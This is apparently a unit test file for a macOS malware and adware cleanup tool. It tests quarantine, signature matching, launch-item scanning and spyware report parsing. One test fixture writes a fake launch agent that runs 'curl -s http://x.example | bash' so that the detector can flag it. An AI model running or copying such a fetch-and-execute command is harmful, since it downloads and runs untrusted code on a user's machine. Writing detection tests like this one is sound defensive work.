"""Unit tests. Everything runs in temporary folders; nothing real is moved.

Run: python3 -I -m unittest discover -s tests   (from the Codi_Clean folder)
"""

import json
import os
import plistlib
import stat
import sys
import tempfile
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from codi_clean import fsutil, malware, quarantine, signatures, ui, zerobreach  # noqa: E402


class SelectionTests(unittest.TestCase):
    def test_ranges_and_lists(self):
        self.assertEqual(ui.parse_selection("1,3-5", 6), [0, 2, 3, 4])
        self.assertEqual(ui.parse_selection("2, 2", 3), [1])

    def test_invalid(self):
        self.assertIsNone(ui.parse_selection("7", 3))
        self.assertIsNone(ui.parse_selection("x", 3))
        self.assertIsNone(ui.parse_selection("0", 3))


class ProtectedPathTests(unittest.TestCase):
    def test_system_and_account_folders_refused(self):
        for path in ("/", "/System/Library", "/usr/bin/true", "/Applications", fsutil.HOME,
                     os.path.join(fsutil.HOME, "Documents"), os.path.join(fsutil.HOME, "Library/Caches"),
                     "/Library/LaunchDaemons"):
            self.assertIsNotNone(fsutil.protected_reason(path), path)

    def test_ordinary_items_allowed(self):
        for path in (os.path.join(fsutil.HOME, "Library/Caches/com.example.app"),
                     "/Library/LaunchDaemons/com.example.plist", "/Applications/Example.app"):
            self.assertIsNone(fsutil.protected_reason(path), path)


class QuarantineTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = os.path.join(self.tmp.name, "q")
        self.victim = os.path.join(self.tmp.name, "evil-agent")
        with open(self.victim, "wb") as fh:
            fh.write(b"\xcf\xfa\xed\xfe" + b"\0" * 5000)
        os.chmod(self.victim, 0o755)

    def tearDown(self):
        self.tmp.cleanup()

    def test_quarantine_restore_roundtrip(self):
        entry = quarantine.quarantine(self.victim, "evil", "test", root=self.root)
        self.assertFalse(os.path.exists(self.victim))
        self.assertTrue(os.path.exists(entry.item_path))
        self.assertEqual(os.stat(entry.item_path).st_mode & 0o111, 0, "run permission removed")
        self.assertEqual(stat.S_IMODE(os.stat(self.root).st_mode), 0o700)
        with open(os.path.join(entry.folder, "manifest.json")) as fh:
            manifest = json.load(fh)
        self.assertEqual(len(manifest["sha256"]), 64)
        self.assertEqual(len(quarantine.entries(self.root)), 1)
        quarantine.restore(entry)
        self.assertTrue(os.path.exists(self.victim))
        self.assertEqual(stat.S_IMODE(os.stat(self.victim).st_mode), 0o755)
        self.assertEqual(quarantine.entries(self.root), [])

    def test_restore_refuses_to_overwrite(self):
        entry = quarantine.quarantine(self.victim, "evil", "test", root=self.root)
        open(self.victim, "w").close()
        with self.assertRaises(FileExistsError):
            quarantine.restore(entry)

    def test_purge(self):
        entry = quarantine.quarantine(self.victim, "evil", "test", root=self.root)
        quarantine.purge(entry)
        self.assertFalse(os.path.exists(entry.folder))

    def test_refuses_protected(self):
        with self.assertRaises(OSError):
            quarantine.quarantine("/usr/bin/true", "x", "y", root=self.root)


class SignatureTests(unittest.TestCase):
    def test_known_names(self):
        self.assertEqual(signatures.match("com.pcv.hlpramc.plist", "Pirrit helper").family, "Pirrit")
        self.assertEqual(signatures.match("FlashPlayer.dmg").family, "Fake Flash Player")
        self.assertEqual(signatures.match("Search Baron").category, "adware")

    def test_no_false_hits_on_common_apps(self):
        for name in ("Google Chrome.app", "com.google.keystone.agent", "Microsoft Word.app",
                     "us.zoom.updater", "com.grammarly.ProjectLlama.Shepherd", "Adobe Acrobat"):
            self.assertIsNone(signatures.match(name), name)


class LaunchItemTests(unittest.TestCase):
    def test_flags_shady_and_leftover_items(self):
        with tempfile.TemporaryDirectory() as tmp:
            def write(name, data):
                with open(os.path.join(tmp, name), "wb") as fh:
                    plistlib.dump(data, fh)
            write("com.good.plist", {"Label": "com.good", "ProgramArguments": ["/bin/ls"]})
            write("com.leftover.plist", {"Label": "com.leftover", "Program": "/nonexistent/helper"})
            write("com.shady.plist", {"Label": "com.shady", "ProgramArguments":
                                      ["/bin/bash", "-c", "curl -s http://x.example | bash"]})
            write("com.vsearch.agent.plist", {"Label": "com.vsearch.agent", "Program": "/nonexistent/v"})
            report = malware.Report()
            with mock.patch.object(malware, "LAUNCH_DIRS", ((tmp, "user"),)):
                malware.check_launch_items(report)
        by_label = {f.launch_label: f for f in report.findings}
        self.assertNotIn("com.good", by_label)
        self.assertEqual(by_label["com.leftover"].category, "leftover")
        self.assertEqual(by_label["com.shady"].severity, "high")
        self.assertEqual(by_label["com.vsearch.agent"].category, "adware")
        self.assertEqual(report.checked["startup items"], 4)


class ZeroBreachTests(unittest.TestCase):
    def test_parse_report(self):
        doc = {"verdict": {"status": "HITS", "gaps": ["g1"]}, "exit_code": 2,
               "modules": {"hash": {"hits": [{"indicator": "abc", "location": "/tmp/x",
                                              "detail": "d", "evidence": "on-disk", "source": "s"}]}},
               "must_relay": [{"text": "not a clean bill"}],
               "next_steps": [{"links": ["https://www.accessnow.org/help/"]}]}
        result = zerobreach.parse_report(doc)
        self.assertEqual(len(result.hits), 1)
        self.assertEqual(result.gaps, ["g1"])
        self.assertEqual(result.help_links, ["https://www.accessnow.org/help/"])
        report = malware.Report()
        malware.add_zero_breach(report, result)
        self.assertEqual(report.findings[0].category, "spyware")
        self.assertFalse(report.findings[0].removable, "file missing, so nothing to quarantine")


if __name__ == "__main__":
    unittest.main()
